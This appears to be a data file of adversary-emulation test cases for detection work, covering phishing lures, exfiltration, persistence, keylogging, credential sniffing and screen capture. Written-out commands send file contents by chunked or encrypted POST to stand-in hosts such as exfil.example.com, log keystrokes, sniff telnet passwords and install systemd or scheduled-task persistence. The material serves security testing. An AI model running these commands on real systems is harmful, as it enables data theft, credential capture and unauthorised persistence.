falsepositives: Legitimate Office processes spawning command shells for automation or scripting purposes
Administrative tasks involving Office and command shells

attacks.description: Creates HTML file mimicking phishing email with verification link
attacks.expected_behavior: Creates HTML file in TEMP directory with benign phishing-like content

attacks.command: cmd.exe /c "echo MsgBox "Your session has expired. Please re-enter your credentials.", vbCritical, "Security Alert" > %TEMP%\phish.vbs && cscript %TEMP%\phish.vbs"
attacks.description: Generates and executes VBScript showing credential prompt
attacks.expected_behavior: Displays modal dialog box requesting credentials via legacy cscript

attacks.command: cmd.exe /c "echo This is a test document. Please enable macros to view content. > %TEMP%\doc.txt && certutil -encode %TEMP%\doc.txt %TEMP%\doc.b64 && certutil -decode %TEMP%\doc.b64 %TEMP%\doc_phish.txt && start %TEMP%\doc_phish.txt"
attacks.description: Simulates document decoy with encoded content retrieval
attacks.expected_behavior: Creates encoded/decoded text file and opens it, mimicking malicious document retrieval

attacks.description: Basic command to list all running processes using PowerShell
attacks.expected_behavior: Lists all running processes

attacks.description: Intermediate command to create a file in the temp directory using PowerShell, overwriting any existing file
attacks.expected_behavior: Creates a file named test.txt in the temp directory with the content 'Hello World'

attacks.description: Advanced command to encode a PowerShell command using Base64
attacks.expected_behavior: Encodes the 'Get-Process' command into Base64

attacks.description: Basic command to get the current date using PowerShell
attacks.expected_behavior: The command will print the current date to the console.

attacks.description: Intermediate command to compress a file using PowerShell
attacks.expected_behavior: The command will create a zip archive of the /tmp/test file and save it to /tmp/test.zip.

attacks.description: Advanced command to download a file using PowerShell
attacks.expected_behavior: The command will download the contents of https://example.com and save it to /tmp/test.txt. If the download fails, it will silently continue.

attacks.description: Start the Windows Update service using net.exe
attacks.expected_behavior: The Windows Update service will be started.

attacks.description: Create a new service using sc.exe
attacks.expected_behavior: A new service named MyService will be created.

attacks.description: Create a new process using PowerShell
attacks.expected_behavior: A new instance of Notepad will be started.

attacks.description: Create a new systemd service and start it
attacks.expected_behavior: A new systemd service will be created and started, demonstrating the Create or Modify System Process technique.

attacks.description: Modify an existing systemd service
attacks.expected_behavior: An existing systemd service will be modified, demonstrating the Create or Modify System Process technique.

attacks.description: Create a new cron job
attacks.expected_behavior: A new cron job will be created, demonstrating the Create or Modify System Process technique. Note: This command requires careful handling, as it can potentially lead to unintended consequences if not used properly.

attacks.description: Basic process injection using PowerShell to spawn cmd.exe and write to a file.
attacks.expected_behavior: A new cmd.exe process is spawned, writing 'Hello' to a file in the temporary directory.

attacks.description: Intermediate process injection using cmd.exe to write to a file and spawn notepad.exe in the background.
attacks.expected_behavior: A new file is created in the temporary directory, and notepad.exe is launched in minimized mode.

attacks.description: Advanced process injection using PowerShell to spawn another PowerShell process with elevated privileges to list running processes.
attacks.expected_behavior: A new PowerShell process is spawned with elevated privileges, listing all running processes.

attacks.description: Basic process injection using gdb to allocate memory in the target process
attacks.expected_behavior: Memory allocation in the target process

attacks.description: Intermediate process injection using gdb to load a malicious library into the target process
attacks.expected_behavior: Malicious library loaded into the target process

attacks.description: Advanced process injection using ptrace to inject shellcode into the target process
attacks.expected_behavior: Shellcode executed within the target process

attacks.description: Downloads a benign file from a test URL using certutil.exe
attacks.expected_behavior: The file test.txt will be downloaded to the %TEMP% directory.

attacks.description: Sends an HTTP request to a test URL using PowerShell
attacks.expected_behavior: The file test.txt will be downloaded to the %TEMP% directory.

attacks.description: Creates an HTTP request to a test URL using PowerShell with .NET classes (NOT RECOMMENDED)
attacks.expected_behavior: An HTTP request will be sent to the test URL, but this method is not recommended as it uses .NET classes directly.

attacks.description: Basic HTTP GET request with custom User-Agent simulating C2 beaconing
attacks.expected_behavior: Sends an HTTP GET request to example.com with 'TestC2' User-Agent header. Server responds with 200 OK or similar.

attacks.description: Intermediate DNS TXT record query for C2 command retrieval
attacks.expected_behavior: Queries DNS TXT record for test.example.com. Returns empty or example.com's default TXT record if it exists.

attacks.description: Advanced encrypted SSL/TLS session establishment over HTTPS
attacks.expected_behavior: Initiates an SSL handshake with example.com:443. Connection remains open until terminated, simulating encrypted C2 channel.

attacks.description: Basic command-line file creation using cmd.exe redirection
attacks.expected_behavior: Creates testfile.txt in %TEMP% containing 'test_string'

attacks.description: Intermediate file encoding using certutil
attacks.expected_behavior: Encodes testfile.txt to Base64 as encodedfile, suppressing error output

attacks.description: Advanced PowerShell web request and file execution
attacks.expected_behavior: Downloads test.txt from example.com to TEMP and opens it with default handler

attacks.description: Basic script creation and execution using bash
attacks.expected_behavior: Creates a temporary shell script in /tmp and executes it, outputting 'test'

attacks.command: bash -c 'for i in {1..3}; do echo "Iteration $i"; done'
attacks.description: Intermediate inline script execution with loop
attacks.expected_behavior: Executes a for loop directly in bash, printing 3 iteration messages

attacks.description: Advanced base64-encoded command execution
attacks.expected_behavior: Decodes and executes base64-encoded 'echo "test"' command via pipeline

attacks.description: Basic file encoding using certutil
attacks.expected_behavior: Creates Base64-encoded file from plaintext input and deletes original

attacks.command: powershell -Command "$f = Join-Path $env:TEMP 'testfile.txt'; 'test_data' | Set-Content $f -Force; Compress-Archive -Path $f -DestinationPath (Join-Path $env:TEMP 'data.zip') -CompressionLevel Fastest -Password 'SafePass123' -Force; Remove-Item $f -ErrorAction SilentlyContinue"
attacks.description: Intermediate password-protected ZIP obfuscation
attacks.expected_behavior: Creates password-protected ZIP archive containing test file and removes original

attacks.description: Advanced PowerShell encoded command execution
attacks.expected_behavior: Executes base64-encoded command to create test file via obfuscated execution flow

attacks.description: Base64 encode and decode a file to obfuscate its contents
attacks.expected_behavior: Creates a copy of /etc/hosts in /tmp via base64 encoding/decoding cycle, demonstrating simple reversible obfuscation

attacks.command: tar czf - /etc/hosts | openssl enc -aes-256-cbc -pass pass:testpassword -out /tmp/hosts.enc && openssl enc -d -aes-256-cbc -pass pass:testpassword -in /tmp/hosts.enc | tar xzf - -C /tmp
attacks.description: Compress and encrypt a file with OpenSSL for layered obfuscation
attacks.expected_behavior: Creates encrypted tarball of /etc/hosts and extracts it to /tmp, showing combined compression/encryption obfuscation

attacks.command: cat /etc/hosts | base64 | rev | base64 > /tmp/hosts.obf && cat /tmp/hosts.obf | base64 -d | rev | base64 -d > /tmp/hosts.deobf
attacks.description: Multiple encoding steps with base64 and reversal for deep obfuscation
attacks.expected_behavior: Applies sequential base64 encoding and character reversal to obfuscate file contents, then reverses the process

attacks.command: echo test > %TEMP%\testfile.txt && certutil -encode %TEMP%\testfile.txt %TEMP%\encodedfile.txt && powershell -Command "$data = Get-Content -Path $env:TEMP\encodedfile.txt -Raw; Invoke-WebRequest -Uri 'http://example.com/exfil' -Method POST -Body $data"
attacks.description: Basic exfiltration using certutil encoding and PowerShell POST
attacks.expected_behavior: Creates test file, Base64 encodes it, and sends encoded content via HTTP POST to example.com

attacks.command: echo test > %TEMP%\testfile.txt && powershell -Command "$data = Get-Content -Path $env:TEMP\testfile.txt -Raw; $chunkSize=100; for ($i=0; $i -lt $data.Length; $i+=$chunkSize) { $chunk = $data.Substring($i, [Math]::Min($chunkSize, $data.Length-$i)); Invoke-WebRequest -Uri ('http://example.com/exfil?part='+$i) -Method POST -Body $chunk }"
attacks.description: Intermediate chunked data exfiltration via PowerShell
attacks.expected_behavior: Splits test file into 100-character chunks and sends each via separate POST requests

attacks.command: echo test > %TEMP%\testfile.txt && powershell -Command "$bytes = Get-Content -Path $env:TEMP\testfile.txt -Encoding Byte -Raw; $data = [Convert]::ToBase64String($bytes); $i=0; while ($i -lt $data.Length) { $chunk = $data.Substring($i, [Math]::Min(50, $data.Length-$i)); Invoke-WebRequest -Uri ('http://example.com/exfil?chunk='+$i) -Method POST -Body $chunk; Start-Sleep -Seconds 2; $i+=50 }"
attacks.description: Advanced Base64-encoded exfiltration with delays
attacks.expected_behavior: Converts file to Base64, sends 50-character chunks every 2 seconds with randomized intervals

attacks.description: Base64 encodes test file and exfiltrates via HTTP POST
attacks.expected_behavior: Encodes /tmp/testfile.txt in base64 and sends via POST request to C2 server endpoint

attacks.command: split -b 500k /tmp/testfile.txt part_ && for f in part_*; do base64 "$f" | curl -X POST --data-binary @- "http://exfil.example.com/$f"; done; rm -f part_*
attacks.description: Splits file into chunks and exfiltrates each chunk separately
attacks.expected_behavior: Creates 500KB file chunks, base64 encodes each, sends via multiple POST requests, then cleans up chunks

attacks.command: openssl enc -aes-256-cbc -salt -pass pass:testpassword -in /tmp/testfile.txt | curl -X POST --data-binary @- http://exfil.example.com/encrypted
attacks.description: Encrypts file with AES-256 before exfiltration
attacks.expected_behavior: Encrypts file using OpenSSL with test password and streams ciphertext via POST request

attacks.description: Downloads a benign executable from a URL using certutil and executes it.
attacks.expected_behavior: The command downloads a file named benign.exe from the specified URL to the temporary directory and then executes it. This simulates exploiting a public-facing application by downloading and running a payload.

attacks.description: Downloads a benign PowerShell script from a URL and executes it using Invoke-Command.
attacks.expected_behavior: This command downloads a PowerShell script from the specified URL to the temporary directory and then executes it, simulating the exploitation of a public-facing application by downloading and executing a malicious script.

attacks.description: Creates a batch file in the temporary directory that opens a benign HTML page in the default browser, simulating user interaction with a potentially exploited public-facing web application.
attacks.expected_behavior: The command creates a batch file, adds a command to open a URL, and then executes the batch file, which opens the specified HTML page in the default browser, demonstrating interaction with a public-facing application.

attacks.description: Basic: Exploit public-facing application by setting up a netcat listener that executes bash upon connection.
attacks.expected_behavior: Sets up a listener on port 8080 that executes bash when a connection is established.

attacks.description: Intermediate: Simulate downloading and executing a malicious script from a public-facing application, assuming the script is benign for testing purposes.
attacks.expected_behavior: Downloads a script, makes it executable, and runs it. For testing, ensure the script is benign.

attacks.description: Advanced: Pipe a potentially exploitable command directly to bash, simulating a sophisticated exploitation technique without executing actual malicious code.
attacks.expected_behavior: Executes commands from a remote source directly in bash, simulating exploitation. Ensure the source is controlled and benign for testing.

attacks.description: Basic WMI process enumeration using legacy wmic.exe
attacks.expected_behavior: Lists running processes via WMI in table format

attacks.description: Intermediate WMI query using PowerShell cmdlet
attacks.expected_behavior: Displays process names and IDs using WMI class

attacks.command: wmic /node:localhost process call create "cmd.exe /c echo test > %TEMP%\wmi_test.txt"
attacks.description: Advanced WMI process creation to write test file
attacks.expected_behavior: Creates wmi_test.txt in TEMP directory via WMI-spawned cmd.exe

attacks.description: Basic WMI system information query targeting remote Windows host
attacks.expected_behavior: Retrieves OS version information from target Windows host using CIM/WMI. Fails silently if host unreachable.

attacks.description: Intermediate WMI process creation on remote Windows host
attacks.expected_behavior: Attempts to start calc.exe on target Windows host via WMI process creation method. Requires valid credentials and admin privileges.

attacks.description: Advanced WMI event subscription for process creation monitoring
attacks.expected_behavior: Creates persistent WMI event subscription to monitor new processes on target host. Requires admin privileges and valid credentials.

attacks.description: Dump local user accounts and passwords using net.exe
attacks.expected_behavior: Output a list of local user accounts and their passwords, if available

attacks.description: Dump local user accounts using powershell.exe and WMI
attacks.expected_behavior: Output a list of local user accounts

attacks.description: Attempt to dump credentials from the system using net.exe
attacks.expected_behavior: Output a list of services related to credentials or an error message if the operation fails

attacks.description: Retrieve user information, potentially including passwords if the system is misconfigured.
attacks.expected_behavior: Lists user information, which may include passwords if the system stores them in plaintext or a reversible format.

attacks.description: Display command history, potentially revealing sensitive information like passwords.
attacks.expected_behavior: Displays the command history, which may contain sensitive information.

attacks.description: Display the contents of the passwd file, which contains user information.
attacks.expected_behavior: Displays user information from the passwd file, which typically does not include passwords but can be used as a starting point for further investigation.

attacks.description: Lists all started services on the local machine.
attacks.expected_behavior: Displays a list of running services on the system.

attacks.description: Uses PowerShell to list all running services on the system, filtering by the 'Running' status.
attacks.expected_behavior: Displays a list of services that are currently running.

attacks.description: Displays all active TCP connections, routing tables, and interface statistics, which can help in discovering network services.
attacks.expected_behavior: Shows all active connections and listening ports, which can indicate available network services.

attacks.description: Basic local network service discovery using netstat
attacks.expected_behavior: Lists all listening TCP/UDP ports on localhost

attacks.description: Intermediate socket statistics check
attacks.expected_behavior: Shows listening TCP sockets with numeric formats

attacks.description: Advanced network service scanning
attacks.expected_behavior: TCP connect scan of all hosts in 192.168.1.0/24 subnet

attacks.description: This command uses PowerShell to compress all files in the Public Documents folder and archives them into a zip file named 'archived_data.zip' in the TEMP directory, overwriting any existing file with the same name.
attacks.expected_behavior: The command will create an archive of the specified files and place it in the TEMP directory, potentially overwriting any existing file with the same name.

attacks.description: This advanced command also uses PowerShell to achieve the archiving but loads the System.IO.Compression.FileSystem assembly to use the ZipFile class for creating the archive, demonstrating an alternative method.
attacks.expected_behavior: Similar to the first command, this will create an archive of the files in the Public Documents folder but uses a different approach by loading a .NET assembly.

attacks.description: This basic command uses the tar command (available in newer Windows versions) to create a compressed tar archive of the files in the Public Documents folder and saves it to the TEMP directory.
attacks.expected_behavior: The command will create a compressed tar archive of the specified files and place it in the TEMP directory.

attacks.description: Basic compression of user documents directory using tar
attacks.expected_behavior: Creates gzip-compressed tarball of Documents folder in /tmp

attacks.description: Intermediate encrypted archive of log files
attacks.expected_behavior: Creates password-protected zip archive of system logs requiring root access

attacks.description: Advanced split archive of SSH configuration
attacks.expected_behavior: Creates multi-part tar archive of sensitive SSH configuration files

attacks.description: Creates a daily scheduled task named 'Updater' launching notepad.exe
attacks.expected_behavior: Creates a scheduled task in Task Scheduler that opens Notepad daily at 9:00 AM

attacks.description: Creates a task running as SYSTEM that writes test text to TEMP on user logon
attacks.expected_behavior: Creates a task that executes on login, writing a test file to the system's TEMP directory

attacks.command: powershell -Command "Set-Content -Path $env:TEMP\task.xml -Value '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers><Actions><Exec><Command>cmd.exe</Command><Arguments>/c echo Scheduled Task Test ^> %TEMP%\task_out.txt</Arguments></Exec></Actions></Task>' -Encoding Unicode; schtasks /Create /XML $env:TEMP\task.xml /TN "CustomTask""
attacks.description: Creates scheduled task via XML definition with logon trigger
attacks.expected_behavior: Generates an XML task definition and imports it, creating a task that runs cmd.exe on user login

attacks.description: Add hourly cron job to system crontab
attacks.expected_behavior: System-wide cron job executes /tmp/test_script.sh every hour

attacks.command:
sudo systemctl enable --now $(printf '[Timer]
OnBootSec=15min
OnUnitActiveSec=1h

[Install]
WantedBy=timers.target' | tee /etc/systemd/system/test-timer.timer >/dev/null) && echo -e '[Service]
ExecStart=/tmp/test_script.sh' | sudo tee /etc/systemd/system/test-timer.service >/dev/null
attacks.description: Create and activate systemd timer/service for persistence
attacks.expected_behavior: Systemd timer triggers test service 15 minutes after boot and hourly thereafter

attacks.description: Add user-level cron job without root
attacks.expected_behavior: User cron executes /tmp/test_script.sh hourly for current user

attacks.description: Captures user input via Read-Host and saves to TEMP
attacks.expected_behavior: Prompts user for input and saves captured credentials to $env:TEMP\creds.txt.

attacks.description: Background keylogger capturing keystrokes to a log file
attacks.expected_behavior: Runs hidden in background, logging all keystrokes to $env:TEMP\keys.log until process termination.

attacks.description: Periodically captures clipboard content to a file
attacks.expected_behavior: Every 10 seconds, appends current clipboard content to $env:TEMP\clipboard.txt.

attacks.description: Records terminal session to capture input
attacks.expected_behavior: Creates hidden log file capturing all terminal input/output until session ends with 'exit' command

attacks.command: xinput test $(xinput list --id-only 'AT Translated Set 2 keyboard') | tee /tmp/keystrokes.log
attacks.description: Captures X11 keyboard events from physical keyboard device
attacks.expected_behavior: Logs real-time keyboard events to /tmp/keystrokes.log while X server is active

attacks.command: sudo tcpdump -i eth0 -A tcp port 23 -l -n | grep -i -e 'login' -e 'password'
attacks.description: Sniffs plaintext credentials from telnet traffic
attacks.expected_behavior: Displays telnet login/password strings in ASCII from network interface eth0 until stopped

attacks.description: Launch built-in Snipping Tool for manual screen capture
attacks.expected_behavior: Snipping Tool GUI appears allowing user to select/capture screen area

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $s = [System.Windows.Forms.SystemInformation]::VirtualScreen; $b = New-Object System.Drawing.Bitmap $s.Width, $s.Height; $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.X, $s.Y, 0, 0, $b.Size); $b.Save(\"$env:TEMP\screenshot.png\")"
attacks.description: Programmatic screen capture using PowerShell drawing classes
attacks.expected_behavior: Creates screenshot.png in %TEMP% containing full screen capture

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $s = [System.Windows.Forms.SystemInformation]::VirtualScreen; $b = New-Object System.Drawing.Bitmap $s.Width, $s.Height; $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.X, $s.Y, 0, 0, $b.Size); $b.Save(\"$env:TEMP\sc.png\"); certutil -encode \"$env:TEMP\sc.png\" \"$env:TEMP\sc.b64\" 2>nul; Remove-Item \"$env:TEMP\sc.png\" -Force"
attacks.description: Advanced capture with base64 encoding and cleanup
attacks.expected_behavior: Creates base64-encoded sc.b64 in %TEMP% after capturing/deleting original PNG

attacks.description: Basic screen capture using scrot utility
attacks.expected_behavior: Creates timestamped PNG screenshot in /tmp directory using default screen capture settings

attacks.description: Intermediate X11 screen capture with ImageMagick
attacks.expected_behavior: Captures entire X11 display using ImageMagick's import tool and saves to /tmp

attacks.description: Advanced frame capture using ffmpeg with dynamic resolution
attacks.expected_behavior: Uses xdpyinfo to detect screen resolution and captures single frame with ffmpeg's x11grab module

attacks.description: Add a registry key to run notepad.exe at login
attacks.expected_behavior: Notepad will open when the user logs in

attacks.description: Add a registry key to run cmd.exe at login (requires admin)
attacks.expected_behavior: Command prompt will open when the user logs in, but requires admin privileges

attacks.description: Use PowerShell to add a registry key to run calc.exe at login
attacks.expected_behavior: Calculator will open when the user logs in

attacks.description: Adds test command to user's bashrc for persistence
attacks.expected_behavior: Command will execute when user logs in, creating /tmp/persistence_test after 30 seconds

attacks.description: Appends test command to rc.local for system-wide persistence
attacks.expected_behavior: Command will execute at system boot, appending to /tmp/rc_local_test

attacks.command:
sudo bash -c 'echo "[Unit]
Description=Test Service
After=network.target

[Service]
ExecStart=/usr/bin/echo Test
Restart=always

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/test_persistence.service' && sudo systemctl enable test_persistence.service
attacks.description: Creates and enables systemd service for advanced persistence
attacks.expected_behavior: Creates persistent systemd service that runs at startup and restarts continuously
